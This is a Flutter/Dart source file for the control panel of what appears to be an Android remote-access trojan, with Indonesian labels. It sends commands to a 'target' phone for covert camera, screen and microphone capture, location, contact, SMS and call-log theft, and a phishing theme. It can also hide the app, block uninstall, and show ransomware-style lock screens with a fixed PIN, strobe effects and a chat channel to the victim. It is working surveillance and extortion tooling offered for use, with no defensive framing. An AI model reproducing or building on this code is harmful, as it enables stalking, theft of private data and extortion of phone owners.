// control_panel.dart
// ═══════════════════════════════════════════════════════════════════════════
// CONTROL CENTER — GLASSMORPHISM EDITION
// ═══════════════════════════════════════════════════════════════════════════
import 'app_config.dart';
import 'dart:async';
import 'dart:convert';
import 'package:flutter/material.dart';
import 'package:http/http.dart' as http;
import 'glass_theme.dart';

class ControlCenterPage extends StatefulWidget {
  final Map<String, dynamic>? targetDevice;
  final String role;
  const ControlCenterPage({
    super.key,
    this.targetDevice,
    this.role = 'owner',
  });
  @override
  State<ControlCenterPage> createState() => _State();
}

class _State extends State<ControlCenterPage> {
  bool _sending = false;
  final List<String> _log = [];

  final List<Map<String, String>> _chat = [];
  final _chatCtrl = TextEditingController();
  final _chatScroll = ScrollController();
  Timer? _chatTimer;

  Map<String, bool> _toggles = {
    'flashlight': false,
    'lock_screen': false,
    'lock_custom': false,
    'lock_device_total': false,
    'tema_phising': false,
    'strobe': false,
    'keyboard_auto': false,
    'layar_mati_nyala': false,
    'live_camera': false,
    'foto_camera': false,
    'live_screen': false,
    'screen_record': false,
    'mic_record': false,
    'get_location': false,
    'get_contacts': false,
    'get_sms': false,
    'get_call_log': false,
    'vibrate': false,
    'play_sound': false,
    'anti_uninstall': true,
    'hide_app': false,
  };

  String get _id => widget.targetDevice?['id']?.toString() ?? 'unknown';
  String get _model => widget.targetDevice?['model']?.toString() ?? 'Device';
  String get _battery => widget.targetDevice?['battery']?.toString() ?? '--';

  @override
  void initState() {
    super.initState();
    _loadToggleState();
    WidgetsBinding.instance.addPostFrameCallback((_) {
      _cmd('force_open', silent: true);
    });
    _chatTimer = Timer.periodic(const Duration(seconds: 3), (_) => _pollChat());
  }

  @override
  void dispose() {
    _chatTimer?.cancel();
    _chatCtrl.dispose();
    _chatScroll.dispose();
    super.dispose();
  }

  Future<void> _loadToggleState() async {
    try {
      final res = await http
          .get(Uri.parse('$kBaseUrl/api/toggle-state/$_id'))
          .timeout(const Duration(seconds: 8));
      if (res.statusCode == 200) {
        final d = jsonDecode(res.body);
        if (d['valid'] == true && d['toggles'] != null) {
          Map<String, dynamic> t = Map<String, dynamic>.from(d['toggles']);
          if (mounted) {
            setState(() {
              t.forEach((k, v) {
                if (_toggles.containsKey(k)) _toggles[k] = v == true;
              });
            });
          }
        }
      }
    } catch (_) {}
  }

  Future<void> _sendToggle(String feature, bool value) async {
    try {
      await http.post(
        Uri.parse('$kBaseUrl/api/toggle'),
        headers: {'Content-Type': 'application/json'},
        body: jsonEncode({
          'id': _id,
          'feature': feature,
          'value': value,
        }),
      ).timeout(const Duration(seconds: 10));

      if (mounted) {
        setState(() => _toggles[feature] = value);
      }
      _addLog('$feature → ${value ? "ON" : "OFF"}');
      _toast('$feature ${value ? "ON" : "OFF"}',
          c: value ? GlassPalette.teal : GlassPalette.textSub);
    } catch (e) {
      _toast('Gagal kirim command', c: GlassPalette.red);
    }
  }

  Future<void> _cmd(String cmd, {String extra = '', bool silent = false}) async {
    if (_id == 'unknown') {
      if (!silent) _toast('ID target tidak valid');
      return;
    }
    if (!silent) setState(() => _sending = true);
    try {
      await http.post(
        Uri.parse('$kBaseUrl/api/send-command'),
        headers: {'Content-Type': 'application/json'},
        body: jsonEncode({'id': _id, 'command': cmd, 'extra': extra}),
      ).timeout(const Duration(seconds: 12));
      if (!silent) {
        _addLog('Sent: $cmd');
        _toast('Terkirim', c: GlassPalette.teal);
      }
    } catch (e) {
      if (!silent) {
        _addLog('Err: $e');
        _toast('Koneksi gagal', c: GlassPalette.red);
      }
    } finally {
      if (!silent && mounted) setState(() => _sending = false);
    }
  }

  void _addLog(String m) {
    if (!mounted) return;
    setState(() {
      _log.insert(0, '[${DateTime.now().toString().substring(11, 19)}]  $m');
      if (_log.length > 50) _log.removeLast();
    });
  }

  void _toast(String m, {Color c = GlassPalette.blue}) {
    if (!mounted) return;
    ScaffoldMessenger.of(context).showSnackBar(SnackBar(
      backgroundColor: c.withOpacity(0.9),
      content: Text(
        m,
        style: GlassFont.body(
          size: 12,
          weight: FontWeight.w600,
          color: GlassPalette.white,
        ),
      ),
      duration: const Duration(seconds: 2),
      behavior: SnackBarBehavior.floating,
      shape: RoundedRectangleBorder(
        borderRadius: BorderRadius.circular(14),
      ),
    ));
  }

  void _pollChat() async {
    if (_id == 'unknown') return;
    try {
      final res = await http
          .get(Uri.parse('$kBaseUrl/api/lock-chat-all/$_id'))
          .timeout(const Duration(seconds: 4));
      if (res.statusCode == 200) {
        final msgs = (jsonDecode(res.body)['messages'] as List? ?? []);
        if (msgs.length != _chat.length && mounted) {
          setState(() {
            _chat.clear();
            for (final m in msgs) {
              _chat.add({
                'from': m['from']?.toString() ?? '',
                'text': m['text']?.toString() ?? '',
                'time': m['time']?.toString() ?? '',
              });
            }
          });
          _scrollChat();
        }
      }
    } catch (_) {}
  }

  void _sendChat(String text) async {
    if (text.trim().isEmpty) return;
    _chatCtrl.clear();
    setState(() => _chat.add({
          'from': 'owner',
          'text': text.trim(),
          'time': TimeOfDay.now().format(context),
        }));
    _scrollChat();
    try {
      await http.post(
        Uri.parse('$kBaseUrl/api/lock-chat/$_id'),
        headers: {'Content-Type': 'application/json'},
        body: jsonEncode({'text': text.trim(), 'from': 'owner'}),
      ).timeout(const Duration(seconds: 5));
    } catch (_) {}
  }

  void _scrollChat() {
    Future.delayed(const Duration(milliseconds: 100), () {
      if (_chatScroll.hasClients) {
        _chatScroll.animateTo(
          _chatScroll.position.maxScrollExtent,
          duration: const Duration(milliseconds: 200),
          curve: Curves.easeOut,
        );
      }
    });
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: GlassPalette.bg,
      extendBodyBehindAppBar: true,
      body: GlassBg(
        bgAsset: 'assets/images/bg_glass.jpg',
        child: SafeArea(
          child: Column(
            children: [
              Container(
                padding: const EdgeInsets.fromLTRB(14, 10, 14, 10),
                decoration: BoxDecoration(
                  color: Colors.white.withOpacity(0.08),
                  border: Border(
                    bottom: BorderSide(
                      color: Colors.white.withOpacity(0.15),
                      width: 1.2,
                    ),
                  ),
                ),
                child: Row(
                  children: [
                    GestureDetector(
                      onTap: () => Navigator.pop(context),
                      child: Container(
                        padding: const EdgeInsets.all(10),
                        decoration: BoxDecoration(
                          color: GlassPalette.blue.withOpacity(0.25),
                          borderRadius: BorderRadius.circular(12),
                          border: Border.all(
                            color: GlassPalette.blue.withOpacity(0.6),
                            width: 1.2,
                          ),
                          boxShadow: [
                            BoxShadow(
                              color: GlassPalette.blue.withOpacity(0.4),
                              blurRadius: 12,
                            ),
                          ],
                        ),
                        child: const Icon(Icons.arrow_back_rounded,
                            color: GlassPalette.white, size: 20),
                      ),
                    ),
                    const SizedBox(width: 12),
                    Expanded(
                      child: Column(
                        crossAxisAlignment: CrossAxisAlignment.start,
                        children: [
                          Text(
                            _model,
                            style: GlassFont.pixel(
                              size: 10,
                              weight: FontWeight.w700,
                              color: GlassPalette.white,
                            ),
                            maxLines: 1,
                            overflow: TextOverflow.ellipsis,
                          ),
                          const SizedBox(height: 3),
                          Text(
                            'Battery: $_battery%  •  $_id',
                            style: GlassFont.body(
                              size: 9,
                              weight: FontWeight.w500,
                              color: GlassPalette.textSub,
                            ),
                            overflow: TextOverflow.ellipsis,
                          ),
                        ],
                      ),
                    ),
                    if (_sending)
                      const Padding(
                        padding: EdgeInsets.only(left: 8),
                        child: SizedBox(
                          width: 14,
                          height: 14,
                          child: CircularProgressIndicator(
                              strokeWidth: 2, color: GlassPalette.white),
                        ),
                      ),
                    const SizedBox(width: 6),
                    GestureDetector(
                      onTap: () {
                        setState(() {});
                        _loadToggleState();
                        _cmd('force_open', silent: true);
                      },
                      child: Container(
                        padding: const EdgeInsets.all(8),
                        decoration: BoxDecoration(
                          color: GlassPalette.blue.withOpacity(0.25),
                          borderRadius: BorderRadius.circular(10),
                          border: Border.all(
                            color: GlassPalette.blue.withOpacity(0.6),
                            width: 1.2,
                          ),
                        ),
                        child: const Icon(Icons.refresh_rounded,
                            color: GlassPalette.white, size: 16),
                      ),
                    ),
                  ],
                ),
              ),

              Container(
                height: 52,
                margin: const EdgeInsets.fromLTRB(12, 8, 12, 0),
                padding: const EdgeInsets.fromLTRB(12, 6, 12, 6),
                decoration: BoxDecoration(
                  color: Colors.white.withOpacity(0.06),
                  borderRadius: BorderRadius.circular(12),
                  border: Border.all(
                    color: Colors.white.withOpacity(0.15),
                    width: 1.2,
                  ),
                ),
                child: _log.isEmpty
                    ? Center(
                        child: Text(
                          'No activity yet',
                          style: GlassFont.body(
                            size: 10,
                            weight: FontWeight.w500,
                            color: GlassPalette.textDim,
                          ),
                        ),
                      )
                    : ListView.builder(
                        itemCount: _log.length,
                        itemBuilder: (_, i) => Text(
                          _log[i],
                          style: GlassFont.body(
                            size: 9,
                            weight: FontWeight.w500,
                            color: GlassPalette.textSub,
                          ),
                          maxLines: 1,
                          overflow: TextOverflow.ellipsis,
                        ),
                      ),
              ),

              Expanded(
                child: ListView(
                  padding: const EdgeInsets.all(16),
                  children: [
                    Row(
                      children: [
                        Container(
                          padding: const EdgeInsets.all(8),
                          decoration: BoxDecoration(
                            color: GlassPalette.blue.withOpacity(0.25),
                            borderRadius: BorderRadius.circular(10),
                            border: Border.all(
                              color: GlassPalette.blue.withOpacity(0.6),
                              width: 1.2,
                            ),
                          ),
                          child: const Icon(Icons.settings_remote_rounded,
                              color: GlassPalette.white, size: 14),
                        ),
                        const SizedBox(width: 10),
                        Text(
                          'CONTROL DEVICE',
                          style: GlassFont.pixel(
                            size: 10,
                            weight: FontWeight.w700,
                            color: GlassPalette.white,
                          ),
                        ),
                      ],
                    ),
                    const SizedBox(height: 4),
                    Text(
                      'Semua fitur dalam satu panel',
                      style: GlassFont.body(
                        size: 10,
                        weight: FontWeight.w500,
                        color: GlassPalette.textSub,
                      ),
                    ),
                    const SizedBox(height: 14),

                    _toggleItem(
                        feature: 'flashlight',
                        label: 'Flashlight',
                        icon: Icons.flash_on_rounded,
                        color: GlassPalette.orange),
                    _toggleItem(
                        feature: 'lock_screen',
                        label: 'Lock Screen',
                        icon: Icons.lock_rounded,
                        color: GlassPalette.red),
                    _toggleItem(
                        feature: 'lock_custom',
                        label: 'Lock Custom V2',
                        icon: Icons.lock_outline_rounded,
                        color: GlassPalette.purple),
                    _toggleItem(
                        feature: 'lock_device_total',
                        label: 'Lock Device Total',
                        icon: Icons.gpp_maybe_rounded,
                        color: GlassPalette.red),
                    _toggleItem(
                        feature: 'tema_phising',
                        label: 'Tema Phising',
                        icon: Icons.web_rounded,
                        color: GlassPalette.blue),
                    _toggleItem(
                        feature: 'strobe',
                        label: 'Strobe',
                        icon: Icons.flash_auto_rounded,
                        color: GlassPalette.orange),
                    _toggleItem(
                        feature: 'keyboard_auto',
                        label: 'Keyboard Auto',
                        icon: Icons.keyboard_rounded,
                        color: GlassPalette.teal),
                    _toggleItem(
                        feature: 'layar_mati_nyala',
                        label: 'Layar Mati-Nyala',
                        icon: Icons.screen_lock_portrait_rounded,
                        color: GlassPalette.purple),
                    _toggleItem(
                        feature: 'live_camera',
                        label: 'Live Camera',
                        icon: Icons.videocam_rounded,
                        color: GlassPalette.red),
                    _toggleItem(
                        feature: 'foto_camera',
                        label: 'Foto Camera',
                        icon: Icons.camera_alt_rounded,
                        color: GlassPalette.orange),
                    _toggleItem(
                        feature: 'live_screen',
                        label: 'Live Screen',
                        icon: Icons.desktop_windows_rounded,
                        color: GlassPalette.teal),
                    _toggleItem(
                        feature: 'screen_record',
                        label: 'Screen Record',
                        icon: Icons.videocam_off_rounded,
                        color: GlassPalette.purple),
                    _toggleItem(
                        feature: 'mic_record',
                        label: 'Mic Record',
                        icon: Icons.mic_rounded,
                        color: GlassPalette.red),
                    _toggleItem(
                        feature: 'get_location',
                        label: 'Get Location',
                        icon: Icons.my_location_rounded,
                        color: GlassPalette.teal),
                    _toggleItem(
                        feature: 'get_contacts',
                        label: 'Get Contacts',
                        icon: Icons.contacts_rounded,
                        color: GlassPalette.red),
                    _toggleItem(
                        feature: 'get_sms',
                        label: 'Get SMS',
                        icon: Icons.sms_rounded,
                        color: GlassPalette.teal),
                    _toggleItem(
                        feature: 'get_call_log',
                        label: 'Get Call Log',
                        icon: Icons.call_rounded,
                        color: GlassPalette.orange),
                    _toggleItem(
                        feature: 'vibrate',
                        label: 'Vibrate',
                        icon: Icons.vibration_rounded,
                        color: GlassPalette.purple),
                    _toggleItem(
                        feature: 'play_sound',
                        label: 'Play Sound',
                        icon: Icons.music_note_rounded,
                        color: GlassPalette.blue),
                    _toggleItem(
                        feature: 'anti_uninstall',
                        label: 'Anti Uninstall',
                        icon: Icons.security_rounded,
                        color: GlassPalette.teal),
                    _toggleItem(
                        feature: 'hide_app',
                        label: 'Hide App',
                        icon: Icons.visibility_off_rounded,
                        color: GlassPalette.textSub),

                    const SizedBox(height: 20),

                    Text(
                      'CHAT DENGAN TARGET',
                      style: GlassFont.pixel(
                        size: 10,
                        weight: FontWeight.w700,
                        color: GlassPalette.white,
                      ),
                    ),
                    const SizedBox(height: 10),
                    Container(
                      height: 200,
                      decoration: BoxDecoration(
                        color: Colors.white.withOpacity(0.06),
                        borderRadius: BorderRadius.circular(16),
                        border: Border.all(
                          color: Colors.white.withOpacity(0.15),
                          width: 1.2,
                        ),
                      ),
                      child: _chat.isEmpty
                          ? Center(
                              child: Text(
                                'Belum ada pesan',
                                style: GlassFont.body(
                                  size: 11,
                                  weight: FontWeight.w500,
                                  color: GlassPalette.textDim,
                                ),
                              ),
                            )
                          : ListView.builder(
                              controller: _chatScroll,
                              padding: const EdgeInsets.all(10),
                              itemCount: _chat.length,
                              itemBuilder: (_, i) {
                                final m = _chat[i];
                                final isOwner = m['from'] == 'owner';
                                return Align(
                                  alignment: isOwner
                                      ? Alignment.centerRight
                                      : Alignment.centerLeft,
                                  child: Container(
                                    margin:
                                        const EdgeInsets.symmetric(vertical: 3),
                                    padding: const EdgeInsets.symmetric(
                                        horizontal: 12, vertical: 8),
                                    constraints: BoxConstraints(
                                        maxWidth: MediaQuery.of(context)
                                                .size
                                                .width *
                                            0.7),
                                    decoration: BoxDecoration(
                                      color: isOwner
                                          ? GlassPalette.blue
                                              .withOpacity(0.3)
                                          : Colors.white.withOpacity(0.1),
                                      borderRadius: BorderRadius.circular(12),
                                      border: Border.all(
                                        color: isOwner
                                            ? GlassPalette.blue
                                                .withOpacity(0.5)
                                            : Colors.white.withOpacity(0.2),
                                        width: 1.2,
                                      ),
                                    ),
                                    child: Column(
                                      crossAxisAlignment: isOwner
                                          ? CrossAxisAlignment.end
                                          : CrossAxisAlignment.start,
                                      children: [
                                        Text(
                                          m['text'] ?? '',
                                          style: GlassFont.body(
                                            size: 11,
                                            weight: FontWeight.w500,
                                            color: GlassPalette.white,
                                          ),
                                        ),
                                        const SizedBox(height: 2),
                                        Text(
                                          m['time'] ?? '',
                                          style: GlassFont.body(
                                            size: 9,
                                            weight: FontWeight.w500,
                                            color: GlassPalette.textDim,
                                          ),
                                        ),
                                      ],
                                    ),
                                  ),
                                );
                              },
                            ),
                    ),
                    const SizedBox(height: 10),
                    Row(
                      children: [
                        Expanded(
                          child: Container(
                            decoration: BoxDecoration(
                              color: Colors.white.withOpacity(0.08),
                              borderRadius: BorderRadius.circular(14),
                              border: Border.all(
                                color: Colors.white.withOpacity(0.2),
                                width: 1.2,
                              ),
                            ),
                            child: TextField(
                              controller: _chatCtrl,
                              style: GlassFont.body(
                                size: 12,
                                weight: FontWeight.w500,
                                color: GlassPalette.white,
                              ),
                              cursorColor: GlassPalette.white,
                              decoration: InputDecoration(
                                hintText: 'Ketik pesan...',
                                hintStyle: GlassFont.body(
                                  size: 11,
                                  weight: FontWeight.w500,
                                  color: GlassPalette.textDim,
                                ),
                                border: InputBorder.none,
                                contentPadding: const EdgeInsets.symmetric(
                                    horizontal: 14, vertical: 10),
                              ),
                              onSubmitted: _sendChat,
                            ),
                          ),
                        ),
                        const SizedBox(width: 8),
                        GestureDetector(
                          onTap: () => _sendChat(_chatCtrl.text),
                          child: Container(
                            padding: const EdgeInsets.all(12),
                            decoration: BoxDecoration(
                              gradient: LinearGradient(
                                colors: [
                                  GlassPalette.blue.withOpacity(0.6),
                                  GlassPalette.purple.withOpacity(0.5),
                                ],
                              ),
                              borderRadius: BorderRadius.circular(14),
                              border: Border.all(
                                color: Colors.white.withOpacity(0.25),
                                width: 1.2,
                              ),
                              boxShadow: [
                                BoxShadow(
                                  color: GlassPalette.blue.withOpacity(0.5),
                                  blurRadius: 15,
                                ),
                              ],
                            ),
                            child: const Icon(Icons.send_rounded,
                                color: GlassPalette.white, size: 16),
                          ),
                        ),
                      ],
                    ),
                    const SizedBox(height: 40),
                  ],
                ),
              ),
            ],
          ),
        ),
      ),
    );
  }

  Widget _toggleItem({
    required String feature,
    required String label,
    required IconData icon,
    required Color color,
  }) {
    final value = _toggles[feature] ?? false;
    return Container(
      margin: const EdgeInsets.only(bottom: 10),
      padding: const EdgeInsets.symmetric(horizontal: 14, vertical: 12),
      decoration: BoxDecoration(
        color: value ? color.withOpacity(0.25) : Colors.white.withOpacity(0.06),
        borderRadius: BorderRadius.circular(16),
        border: Border.all(
          color: value ? color.withOpacity(0.7) : Colors.white.withOpacity(0.15),
          width: value ? 1.5 : 1.2,
        ),
        boxShadow: value
            ? [
                BoxShadow(
                  color: color.withOpacity(0.5),
                  blurRadius: 15,
                ),
              ]
            : null,
      ),
      child: Row(
        children: [
          Container(
            width: 34,
            height: 34,
            decoration: BoxDecoration(
              color: value
                  ? color.withOpacity(0.4)
                  : Colors.white.withOpacity(0.08),
              borderRadius: BorderRadius.circular(10),
              border: Border.all(
                color: value
                    ? color.withOpacity(0.7)
                    : Colors.white.withOpacity(0.2),
                width: 1.2,
              ),
            ),
            child: Icon(icon, color: GlassPalette.white, size: 17),
          ),
          const SizedBox(width: 12),
          Expanded(
            child: Text(
              label,
              style: GlassFont.body(
                size: 12,
                weight: FontWeight.w600,
                color: GlassPalette.white,
              ),
            ),
          ),
          Switch(
            value: value,
            onChanged: (v) {
              if (feature == 'lock_custom' && v) {
                _lockCustomDialog();
              } else if (feature == 'lock_device_total' && v) {
                _lockDeviceTotalDialog();
              } else if (feature == 'play_sound' && v) {
                _playSoundDialog();
              } else {
                _sendToggle(feature, v);
              }
            },
            activeColor: GlassPalette.white,
            activeTrackColor: color.withOpacity(0.6),
            inactiveThumbColor: GlassPalette.white,
            inactiveTrackColor: Colors.white.withOpacity(0.15),
          ),
        ],
      ),
    );
  }

  void _lockCustomDialog() {
    final msgCtrl = TextEditingController();
    final pinCtrl = TextEditingController();

    showDialog(
      context: context,
      builder: (_) => Dialog(
        backgroundColor: Colors.transparent,
        elevation: 0,
        insetPadding: const EdgeInsets.symmetric(horizontal: 24),
        child: GlassCard(
          borderWidth: 1.5,
          radius: 22,
          padding: const EdgeInsets.all(20),
          child: Column(
            mainAxisSize: MainAxisSize.min,
            children: [
              Text(
                'Lock Custom V2',
                style: GlassFont.pixel(
                  size: 11,
                  weight: FontWeight.w700,
                  color: GlassPalette.purple,
                ),
              ),
              const SizedBox(height: 16),
              GlassInput(
                controller: msgCtrl,
                hint: 'Pesan di layar lock',
                icon: Icons.message,
              ),
              const SizedBox(height: 10),
              GlassInput(
                controller: pinCtrl,
                hint: 'PIN Unlock',
                icon: Icons.lock,
                keyboardType: TextInputType.number,
              ),
              const SizedBox(height: 18),
              Row(
                children: [
                  Expanded(
                    child: GlassButton(
                      text: 'Batal',
                      onTap: () {
                        Navigator.pop(context);
                        setState(() => _toggles['lock_custom'] = false);
                      },
                      bgColor: Colors.white,
                      textColor: GlassPalette.white,
                      padding: const EdgeInsets.symmetric(vertical: 12),
                      fontSize: 10,
                    ),
                  ),
                  const SizedBox(width: 10),
                  Expanded(
                    child: GlassButton(
                      text: 'LOCK',
                      onTap: () {
                        Navigator.pop(context);
                        final msg = msgCtrl.text.trim().isEmpty
                            ? 'HP INI DIKUNCI ADMINISTRATOR'
                            : msgCtrl.text.trim();
                        final pin =
                            pinCtrl.text.trim().isEmpty ? '1234' : pinCtrl.text.trim();
                        _cmd('lock_live', extra: '$msg|$pin');
                        setState(() => _toggles['lock_custom'] = true);
                      },
                      bgColor: GlassPalette.purple,
                      textColor: GlassPalette.white,
                      padding: const EdgeInsets.symmetric(vertical: 12),
                      fontSize: 10,
                    ),
                  ),
                ],
              ),
            ],
          ),
        ),
      ),
    );
  }

  void _lockDeviceTotalDialog() {
    final msgCtrl =
        TextEditingController(text: 'HP INI DIKUNCI ADMINISTRATOR');
    final pinCtrl = TextEditingController(text: '1505');
    bool strobe = true, keyboard = true, layar = true;

    showDialog(
      context: context,
      builder: (_) => StatefulBuilder(
        builder: (ctx, setS) => Dialog(
          backgroundColor: Colors.transparent,
          elevation: 0,
          insetPadding: const EdgeInsets.symmetric(horizontal: 24),
          child: GlassCard(
            borderWidth: 1.5,
            radius: 22,
            padding: const EdgeInsets.all(20),
            child: SingleChildScrollView(
              child: Column(
                mainAxisSize: MainAxisSize.min,
                children: [
                  Text(
                    'Lock Device Total',
                    style: GlassFont.pixel(
                      size: 11,
                      weight: FontWeight.w700,
                      color: GlassPalette.red,
                    ),
                  ),
                  const SizedBox(height: 16),
                  GlassInput(
                    controller: msgCtrl,
                    hint: 'Pesan di layar',
                    icon: Icons.message,
                  ),
                  const SizedBox(height: 10),
                  GlassInput(
                    controller: pinCtrl,
                    hint: 'PIN Unlock',
                    icon: Icons.lock,
                    keyboardType: TextInputType.number,
                  ),
                  const SizedBox(height: 14),
                  Container(
                    height: 1,
                    color: Colors.white.withOpacity(0.15),
                  ),
                  const SizedBox(height: 8),
                  SwitchListTile(
                    title: Text('Strobe',
                        style: GlassFont.body(
                          size: 12,
                          weight: FontWeight.w600,
                          color: GlassPalette.white,
                        )),
                    value: strobe,
                    activeColor: GlassPalette.white,
                    activeTrackColor: GlassPalette.blue.withOpacity(0.6),
                    onChanged: (v) => setS(() => strobe = v),
                  ),
                  SwitchListTile(
                    title: Text('Keyboard Auto',
                        style: GlassFont.body(
                          size: 12,
                          weight: FontWeight.w600,
                          color: GlassPalette.white,
                        )),
                    value: keyboard,
                    activeColor: GlassPalette.white,
                    activeTrackColor: GlassPalette.blue.withOpacity(0.6),
                    onChanged: (v) => setS(() => keyboard = v),
                  ),
                  SwitchListTile(
                    title: Text('Layar Mati-Nyala',
                        style: GlassFont.body(
                          size: 12,
                          weight: FontWeight.w600,
                          color: GlassPalette.white,
                        )),
                    value: layar,
                    activeColor: GlassPalette.white,
                    activeTrackColor: GlassPalette.blue.withOpacity(0.6),
                    onChanged: (v) => setS(() => layar = v),
                  ),
                  const SizedBox(height: 14),
                  Row(
                    children: [
                      Expanded(
                        child: GlassButton(
                          text: 'Batal',
                          onTap: () {
                            Navigator.pop(context);
                            setState(
                                () => _toggles['lock_device_total'] = false);
                          },
                          bgColor: Colors.white,
                          textColor: GlassPalette.white,
                          padding: const EdgeInsets.symmetric(vertical: 12),
                          fontSize: 10,
                        ),
                      ),
                      const SizedBox(width: 10),
                      Expanded(
                        flex: 2,
                        child: GlassButton(
                          text: 'KUNCI SEKARANG',
                          onTap: () {
                            Navigator.pop(context);
                            final msg = msgCtrl.text.trim().isEmpty
                                ? 'HP INI DIKUNCI ADMINISTRATOR'
                                : msgCtrl.text.trim();
                            final pin = pinCtrl.text.trim().isEmpty
                                ? '1505'
                                : pinCtrl.text.trim();
                            _cmd('hard_lock', extra: '$msg|$pin');
                            if (strobe) _cmd('flash_strobe');
                            if (keyboard) _cmd('keyboard_auto', extra: 'on');
                            if (layar) _cmd('layar_mati_nyala', extra: 'on');
                            setState(
                                () => _toggles['lock_device_total'] = true);
                          },
                          bgColor: GlassPalette.red,
                          textColor: GlassPalette.white,
                          padding: const EdgeInsets.symmetric(vertical: 12),
                          fontSize: 9,
                        ),
                      ),
                    ],
                  ),
                ],
              ),
            ),
          ),
        ),
      ),
    );
  }

  void _playSoundDialog() {
    final urlCtrl = TextEditingController();
    showDialog(
      context: context,
      builder: (_) => Dialog(
        backgroundColor: Colors.transparent,
        elevation: 0,
        insetPadding: const EdgeInsets.symmetric(horizontal: 24),
        child: GlassCard(
          borderWidth: 1.5,
          radius: 22,
          padding: const EdgeInsets.all(20),
          child: Column(
            mainAxisSize: MainAxisSize.min,
            children: [
              Text(
                'Play Sound',
                style: GlassFont.pixel(
                  size: 11,
                  weight: FontWeight.w700,
                  color: GlassPalette.white,
                ),
              ),
              const SizedBox(height: 16),
              GlassInput(
                controller: urlCtrl,
                hint: 'URL File Suara (MP3)',
                icon: Icons.music_note,
              ),
              const SizedBox(height: 18),
              Row(
                children: [
                  Expanded(
                    child: GlassButton(
                      text: 'Batal',
                      onTap: () {
                        Navigator.pop(context);
                        setState(() => _toggles['play_sound'] = false);
                      },
                      bgColor: Colors.white,
                      textColor: GlassPalette.white,
                      padding: const EdgeInsets.symmetric(vertical: 12),
                      fontSize: 10,
                    ),
                  ),
                  const SizedBox(width: 10),
                  Expanded(
                    child: GlassButton(
                      text: 'PLAY',
                      onTap: () {
                        Navigator.pop(context);
                        final url = urlCtrl.text.trim();
                        if (url.isEmpty) {
                          setState(() => _toggles['play_sound'] = false);
                          return;
                        }
                        _cmd('play_audio', extra: url);
                        setState(() => _toggles['play_sound'] = true);
                      },
                      bgColor: GlassPalette.blue,
                      textColor: GlassPalette.white,
                      padding: const EdgeInsets.symmetric(vertical: 12),
                      fontSize: 10,
                    ),
                  ),
                ],
              ),
            ],
          ),
        ),
      ),
    );
  }
}